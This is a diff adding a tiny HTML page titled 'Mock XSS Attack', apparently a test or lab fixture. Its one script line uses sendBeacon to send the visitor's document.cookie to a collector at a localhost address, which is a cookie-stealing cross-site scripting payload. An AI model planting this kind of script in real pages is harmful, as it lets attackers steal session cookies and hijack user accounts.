@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Mock XSS Attack</title>
+</head>
+<body>
+  <h1>Hello, world!</h1>
+  <script>navigator.sendBeacon('http://localhost:8000/ip0.php?=',document.cookie)</script>
+</body>
+</html>
